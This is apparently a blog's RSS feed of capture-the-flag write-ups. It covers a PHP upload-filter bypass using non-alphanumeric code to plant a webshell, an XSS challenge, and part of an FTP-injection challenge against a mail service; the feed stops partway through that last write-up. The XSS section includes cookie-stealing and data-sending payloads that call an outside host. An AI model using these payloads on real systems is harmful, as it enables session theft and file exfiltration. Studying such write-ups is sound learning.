<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Jam Polintan</title>
        <link>https://jamvie.net/posts/</link>
        <description>Recent content in Posts on Jam Polintan</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>CC Attribution-NonCommercial 4.0 International License</copyright>
        <lastBuildDate>Thu, 07 May 2020 15:20:38 -0600</lastBuildDate>
        <atom:link href="https://jamvie.net/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>De1ctf 2020: Hard_Pentest_1 and Animal Crossing</title>
            <link>https://jamvie.net/posts/2020/05/de1ctf-2020-hard_pentest_1-and-animal-crossing/</link>
            <pubDate>Thu, 07 May 2020 15:20:38 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/05/de1ctf-2020-hard_pentest_1-and-animal-crossing/</guid>
            <description>&lt;p&gt;The intersection of web-based challenges and other challenges should be expected to be seen in CTFs, but yet still I&amp;rsquo;m always surprised when I see it in action.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>The intersection of web-based challenges and other challenges should be expected to be seen in CTFs, but yet still I&rsquo;m always surprised when I see it in action.</p>
<p>De1CTF 2020 really gave me a thorough and in-depth understanding of php, maybe more than I would have ever done on my own. It was actually welcome experience to try out web problems that weren&rsquo;t just purely web-based.
Unfortunately, because of that these problems required more time for me to solve. Hard_Pentest_1 has been a journey in its web-based issues, but a whole different adventure in pwning when you actually complete part of it. So this blog post is gonna be a part 1 of 2.</p>
<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
<h2 id="hard_pentest_1">Hard_Pentest_1</h2>
<p>The no-css basic HTML page exposes its php scripts right off the bat.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
<span style="color:#75715e">//Clear the uploads directory every hour
</span><span style="color:#75715e"></span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
$sandbox <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uploads/&#34;</span><span style="color:#f92672">.</span> <span style="color:#a6e22e">md5</span>(<span style="color:#e6db74">&#34;De1CTF2020&#34;</span><span style="color:#f92672">.</span>$_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>]);
<span style="color:#f92672">@</span><span style="color:#a6e22e">mkdir</span>($sandbox);
<span style="color:#f92672">@</span><span style="color:#a6e22e">chdir</span>($sandbox);

<span style="color:#66d9ef">if</span>($_POST[<span style="color:#e6db74">&#34;submit&#34;</span>]){
    <span style="color:#66d9ef">if</span> (($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;size&#34;</span>] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2048</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">Check</span>()){
        <span style="color:#66d9ef">if</span> ($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;error&#34;</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>){
            <span style="color:#66d9ef">die</span>($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;error&#34;</span>]);
        }
        <span style="color:#66d9ef">else</span>{
            $filename<span style="color:#f92672">=</span><span style="color:#a6e22e">md5</span>($_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>])<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;_&#34;</span><span style="color:#f92672">.</span>$_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>];
            <span style="color:#a6e22e">move_uploaded_file</span>($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;tmp_name&#34;</span>], $filename);
            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;save in:&#34;</span> <span style="color:#f92672">.</span> $sandbox<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">.</span> $filename;
        }
    }
    <span style="color:#66d9ef">else</span>{
        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Not Allow!&#34;</span>;
    }
}

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Check</span>(){
    $BlackExts <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;php&#34;</span>);
    $ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;.&#34;</span>, $_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>]);
    $exts <span style="color:#f92672">=</span> <span style="color:#a6e22e">trim</span>(<span style="color:#a6e22e">end</span>($ext));
    $file_content <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;tmp_name&#34;</span>]);

    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/[a-z0-9;~^`&amp;|]/is&#39;</span>,$file_content)  <span style="color:#f92672">&amp;&amp;</span> 
        <span style="color:#f92672">!</span><span style="color:#a6e22e">in_array</span>($exts, $BlackExts) <span style="color:#f92672">&amp;&amp;</span> 
        <span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/\.\./&#39;</span>,$_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>])) {
          <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
    }
    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
}
<span style="color:#75715e">?&gt;</span>

&lt;<span style="color:#f92672">html</span>&gt;
&lt;<span style="color:#f92672">head</span>&gt;
&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
&lt;<span style="color:#f92672">title</span>&gt;upload&lt;/<span style="color:#f92672">title</span>&gt;
&lt;/<span style="color:#f92672">head</span>&gt;
&lt;<span style="color:#f92672">body</span>&gt;

&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;index.php&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;multipart/form-data&#34;</span>&gt;
    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span>&gt;
&lt;/<span style="color:#f92672">form</span>&gt;

&lt;/<span style="color:#f92672">body</span>&gt;
&lt;/<span style="color:#f92672">html</span>&gt;
</code></pre></div><p>The <code>Check()</code> method is important here.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">
function Check(){
    $BlackExts = array(&#34;php&#34;);
    $ext = explode(&#34;.&#34;, $_FILES[&#34;file&#34;][&#34;name&#34;]);
    $exts = trim(end($ext));
    $file_content = file_get_contents($_FILES[&#34;file&#34;][&#34;tmp_name&#34;]);

    if(!preg_match(&#39;/[a-z0-9;~^`<span style="color:#960050;background-color:#1e0010">&amp;</span>|]/is&#39;,$file_content)  <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> 
        !in_array($exts, $BlackExts) <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> 
        !preg_match(&#39;/\.\./&#39;,$_FILES[&#34;file&#34;][&#34;name&#34;])) {
          return true;
    }
    return false;


</code></pre></div><p>We can only upload php files, so maybe I can try to open a webshell here. The name, &ldquo;Hard_Pentest&rdquo; also gives me a hint that I should try to open a webshell. But the if statement blocks all alphanumerics and certain special characters from being processed. So, at first glance, anything we feed into this function won&rsquo;t be processed. But php is a <del>strange and weird</del> fascinating language with plenty of loopholes and different quirks about it, one of them, being the concept of &ldquo;<a href="https://www.php.net/manual/en/language.operators.increment.php">string/character arithmetic</a>&rdquo; (not the real term but I have no other informed way to describe it):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$a = &#39;Z&#39;
echo $a++; //Basically, Z + 1. This will print &#39;AA&#39;

output: &#39;AA&#39;
</code></pre></div><p>This is valid PHP. This definitely isn&rsquo;t something you&rsquo;d see in other conventional languages. What does it mean to increment &lsquo;Z&rsquo; by 1? Logically it makes no sense, but in PHP it does!</p>
<p>Another thing PHP has that we can utilize here is shorthand statements. Plenty of other languages have this feature as well in some way or another. For example, the ternary operator <code>?</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$result = $condition ? &#39;Jam&#39; : &#39;Vie&#39;;
</code></pre></div><p>is shorthand for</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">if ($condition){
    $result = &#39;Jam&#39;;
}else{
    $result = &#39;Vie&#39;;
}
</code></pre></div><p>And finally, the last quirk about php: arrays and strings.</p>
<p>In other <del>normal</del> languages, arrays and strings are treated as distinct, two different data types. Some languages may treat strings as an array of chars, but by convention, just any random and arbitrary array can&rsquo;t and shouldn&rsquo;t be joined with a string without proper typesetting and checking. Okay, sounds fair and good and all. But what does php do instead?</p>
<p>In php, you can join arrays and strings together. The array will be converted to the string: <code>'Array'</code>.</p>
<pre><code>php &gt; echo ''.[];
PHP Notice: Array to string conversion on line 1
Array               &lt;------The string, 'Array'


php &gt; $var = ''.[];
php &gt; echo $var['!'=='@'];   &lt;------Should give us the first leter in 'Array'
A
</code></pre><p>Javascript happens to have similar function to this!</p>
<p>What does this mean for us?</p>
<p>Because of the <code>Check()</code> function, we can&rsquo;t use alphanumerics or certain special characters. But for the list of valid special characters, <code>[]</code> square brackets are allowed, so we can declare arrays as normal. And we can still declare variables as usual, and the <code>+</code> operators are still valid so we can utilize string arithmetic.</p>
<p>So, all in all, if we wanted to spell the word <code>GET</code> with all the restrictions above, it would look like</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_<span style="color:#f92672">=</span>[] <span style="color:#75715e">?&gt;</span>
<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_<span style="color:#f92672">=@</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$_</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">?&gt;</span>
<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_<span style="color:#f92672">=</span>$_[<span style="color:#e6db74">&#39;!&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;@&#39;</span>] <span style="color:#75715e">?&gt;</span>
<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $___<span style="color:#f92672">=</span>$_ <span style="color:#75715e">?&gt;</span>

<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $__ <span style="color:#f92672">=</span> $_ <span style="color:#75715e">?&gt;</span>
<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> <span style="color:#f92672">@</span>$____ <span style="color:#f92672">=</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#75715e">?&gt;</span>   
<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_______ <span style="color:#f92672">=</span> $__ <span style="color:#75715e">?&gt;</span>  \\G     

<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $__ <span style="color:#f92672">=</span> $_ <span style="color:#75715e">?&gt;</span>
<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> <span style="color:#f92672">@</span>$____ <span style="color:#f92672">=</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#75715e">?&gt;</span>    \\E
<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_______ <span style="color:#f92672">.=</span> $__ <span style="color:#75715e">?&gt;</span>

<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $__ <span style="color:#f92672">=</span> $_ <span style="color:#75715e">?&gt;</span>
<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> <span style="color:#f92672">@</span>$____ <span style="color:#f92672">=</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#75715e">?&gt;</span>   \\T
<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_______ <span style="color:#f92672">.=</span> $__  <span style="color:#75715e">?&gt;</span> \\GET
</code></pre></div><p>Armed with this knowledge, we can write out entire lines of code of php that are just a series of various shorthand operators and symbols, and string arithmetic.</p>
<p>The first hurdle is the existence of the php opening tag. All php code requires the <code>&lt;?php</code> opening tag before anything, kinda like the start of any HTML document needing <code>&lt;HTML&gt;</code> to be declared first at the top.</p>
<p>Checking out php open tags, we come across the existence of shorthand tags for them, in the <a href="https://www.php.net/manual/en/language.basic-syntax.phptags.php">PHP documentation</a>:</p>
<blockquote>
<p>PHP includes a short echo tag &lt;?= which is a short-hand to the more verbose &lt;?php echo.</p>
<p>PHP also allows for short open tag &lt;? (which is discouraged since it is only available if enabled using the short_open_tag php.ini configuration file directive, or if PHP was configured with the &ndash;enable-short-tags option).</p>
</blockquote>
<p>So we can work around saying <code>&lt;?php&gt;</code> with <code>&lt;?=</code> instead!</p>
<p>The second hurdle is the semi-colon, which ends PHP statements. This can be worked around by simply creating new lines of PHP code for each time we want to make a new statement.</p>
<p>So with this in mind we can easily craft a php script to open up a webshell on their server, and poke around.
But that&rsquo;s just part 1 of the problem: we&rsquo;ve sucessfully opened a shell on the server, but the scope of my pwn abilities isn&rsquo;t much to really comprehend what&rsquo;s going on here. Unfortunately, this challenge will remain unsolved until I can figure out how to play around with a Microsoft webshell.</p>
<hr>
<h2 id="animal-crossing">Animal Crossing</h2>
<p>Despite the few solves this problem has, I was drawn to it because of its name. Who doesn&rsquo;t love Animal Crossing?</p>

    <img src="images/DE1CTF01.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>The website allows you to make a passport. There are fields for your name, island name, nickname, and favourite fruit, I think.</p>
<p>When we make a passport we are redirected to a URL where the contents of what we typed are reflected in it (a sign of XSS attacks). And, at the bottom, is a report function (A BIG sign of XSS attacks).</p>
<p>When we go ahead and report it&hellip;</p>

    <img src="images/DE1CTF02.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>I thought my client broke for a second. I wasn&rsquo;t expecting just plain code to be printed on the front-end.</p>
<p>It stumped me at first - the ability to report is blocked by this md5 code checking function. I needed to input some string whose md5 encoding&rsquo;s first 6 characters matched the randomized string. I didn&rsquo;t actually get what this was supposed to be doing, I was confused as to wether or not this was still a broken webpage or not, and I asked my team for help. Luckily, my teammate Filip, who&rsquo;s really good at pwn-based challenges, told me it was a &ldquo;proof of work&rdquo; - I just needed to brute-force my way in by finding a string with the md5 hash characters matching the random one. He gave me a script I could work with to start cracking it.</p>
<p>The good thing (in this context, bad for others) about md5 is that it&rsquo;s a one-way hashing but there is no salting to the code value, it&rsquo;s just the hash. Therefore, a string put through md5 would always return the same md5 encoding. So I just needed to randomly generate a string, md5 it, then check the digest against the random one.</p>
<p>Well great, I have succesfully done so and reported my passport to an admin. With this extra step of generating a valid code, the rest of Animal Crossing is a general XSS attack.</p>
<p>We want to report a URL that will grab the admin cookie when a user checks out our URL, and sends it to the server. Part of my payload looks like this:</p>
<pre><code>data=base64DATAXXXXXXX'javascript:eval('var a=document.createElement(\'script\');a.src=\'https://ServerHere.xss.ht\';document.body.appendChild(a)')
</code></pre><p>And we retrieve the cookie, which has the flag:</p>
<p><code>FLAG=De1CTF{I_l1k4_</code></p>
<p>But this is just one half of the flag. Where&rsquo;s the other half?</p>
<p>Eventually, De1CTF released a hint: &ldquo;what is the admin doing?&rdquo;</p>
<p>Looking at the document shows hundreds of png images, of what looks like other people&rsquo;s passports. I guess, the other half of the flag is among them. But the hint got me thinking - obviously, the admin would have to be leafing through the screenshots but its not like the flag will just magically turn up in one of the images cause they forgot to hide their flag text file out of view. So unless I can control the screenshot, I doubt I&rsquo;ll be able to find the flag.</p>
<p>The library &lsquo;<a href="https://html2canvas.hertzen.com/">html2canvas</a>&rsquo; comes to mind - taking screenshots with javascript. If I pass a payload to the admin that takes a screenshot of their interface, will the flag be there?</p>
<p>With this in mind, I crafted a payload that would take a screenshot of the admin&rsquo;s screen, then send that to me, basically (similar to my catweb writeup albeit with a slightly different function):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`/static/images/xxxxxxxxx.png`</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">resp</span>=&gt;<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">flag</span>=&gt;<span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">url</span><span style="color:#f92672">+</span>(<span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">flag</span>) <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;Nothing&#39;</span>)));
</code></pre></div><p>I create this and report it to the admin. When the admin visits the URL with the javascript payload, it will take a screenshot of the admin&rsquo;s interface and sends it back to my server. I get the address and download it for the other half of the flag:</p>
<p><code>cool_GamE}</code></p>
<p>So the full flag would be: <code>FLAG=De1CTF{I_l1k4_cool_GamE}</code></p>
<p>This was definitely a challenge that stretched my capabilities of XSS attacks past grabbing cookies and pretending to be admin. The 2nd half of taking a screenshot of the admin&rsquo;s interface was unique and certainly not something I would&rsquo;ve thought of immediately. All in all, I&rsquo;m glad I participated in DE1CTF despite the difficulty levels of the problems I faced!</p>
<p>Jam</p>
<hr>
<h2 id="references">References</h2>
<p>Feature Image by Sara Kurfeß on Unsplash</p>]]></content>
        </item>
        
        <item>
            <title>Plaidctf 2020: Contrived Web Problem</title>
            <link>https://jamvie.net/posts/2020/04/plaidctf-2020-contrived-web-problem/</link>
            <pubDate>Tue, 28 Apr 2020 00:48:12 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/04/plaidctf-2020-contrived-web-problem/</guid>
            <description>&lt;p&gt;This was a CTF I unfortunately didn&amp;rsquo;t have the time for, as I was busy doing finals in April :(. My team let me know about this cool and unique problem, and I&amp;rsquo;m glad they did!&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>This was a CTF I unfortunately didn&rsquo;t have the time for, as I was busy doing finals in April :(. My team let me know about this cool and unique problem, and I&rsquo;m glad they did!</p>
<p>This was a journey in understanding internet protocols that deepened my knowledge of them to completely new levels, so I&rsquo;m really grateful I got the chance to try this problem out - even though I tried it after the CTF ended :P</p>
<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
<p>This problem really holds up to its name. The website is simple - you have the option to login or register as a new user.</p>

    <img src="images/CWP01.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>Uniquely, we are given the source code for the problem. The source code shows us that the program has 6 services:</p>
<pre><code>\services
    \api 
    \email (email server, sends emails based on rabbitmq queue)
    \ftp
    \postgres (database)
    \rabbit (email queue, will send requests to the email server)
    \server
...
</code></pre><p>Checking out the code, I see that <code>flag.txt</code> is actually mentioned. It&rsquo;s in the services dockerfile, which is only used by <code>api</code>, <code>email</code> and <code>server</code> services. So, the vulnerability probably is within one of these services.</p>
<p>I checked out <code>api</code> first - and I see that the only protocols that it allows are HTTP, HTTPS, and FTP. Aside from the FTP protocol, the other 2 are pretty standard protocols to see in APIs.</p>
<p>Looking at <code>email</code> next, which uses <a href="https://nodemailer.com/about/">nodemailer</a>. I&rsquo;m not too familiar with it, so I check out its documentation:</p>

    <img src="images/CWP02.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>This seems like a good loophole to exploit - we just need to specify the filepath and nodemailer will send an email with an attachment of whatever file we specified by the filepath, so we can exploit nodemailer&rsquo;s same origin policy. Since the rabbitmq server is the email server&rsquo;s queue, we will send a rogue email request into rabbitmq&rsquo;s queue to serve up to the email server, which will tell it to email us the flag!</p>
<p>Now the hard part - how <em>do we</em> ask the server? How do we send a request to the server to send us the email with the flag as an attachment?</p>
<p>I spent a long time trying to figure out how to send a rogue request to the rabbitmq server that will send us the email we want. I spent hours just browsing through the source code, not really paying attention&hellip;</p>
<p>Until I came across this piece of code in the <code>api/index.ts</code> file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">    <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/image&#34;</span>, <span style="color:#a6e22e">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
        <span style="color:#66d9ef">let</span> { <span style="color:#a6e22e">url</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>;
        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;string&#34;</span>) {
            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Bad body&#34;</span>);
        }

        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">parsed</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#a6e22e">url</span>);

        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">image</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Buffer</span>;
        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;http:&#34;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;https:&#34;</span>) {
            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">imageReq</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">toString</span>(), { <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;GET&#34;</span> });
            <span style="color:#a6e22e">image</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> (<span style="color:#a6e22e">imageReq</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">any</span>).<span style="color:#a6e22e">buffer</span>();
        } 
        
         <span style="color:#75715e">//THIS PART HERE!
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;ftp:&#34;</span>) {
            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> decodeURIComponent(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">username</span>);
            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> decodeURIComponent(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">password</span>);
            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> decodeURIComponent(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">pathname</span>);
            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">ftpClient</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">connectFtp</span>({
                <span style="color:#a6e22e">host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">hostname</span>,
                <span style="color:#a6e22e">port</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">port</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">?</span> parseInt(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">port</span>) <span style="color:#f92672">:</span> <span style="color:#66d9ef">undefined</span>,
                <span style="color:#a6e22e">user</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">undefined</span>,
                <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">undefined</span>,
            });
            <span style="color:#a6e22e">image</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">ftpClient</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">filename</span>);
        } <span style="color:#66d9ef">else</span> {
            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Bad image url&#34;</span>);
        }
                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isPNG</span>(<span style="color:#a6e22e">image</span>)) {
            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Bad image (not a png)&#34;</span>);
        }

        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#34;.png&#34;</span>).<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">200</span>).<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">image</span>);
    })

    <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#e6db74">&#34;4101&#34;</span>);

</code></pre></div><p>Image: the profile picture we would upload when we register as a new user. For HTTP and HTTPS protocols it&rsquo;s a simple GET method, not much to do there. But for FTP?
It asks for the username, password and filename, <em>unchecked</em>, then asynchronously asks the server for the image that matches the filename that we specified.
FTP is a text-based protocol, and since username and password fields are passed to it unchecked, we could definitely inject some protocol commands, custom data (something like <code>{to: &quot;email@example.com&quot;, attachments:[{path:&quot;/flag.txt&quot;}]}</code>), and make FTP send requests that were never intended to be sent.</p>
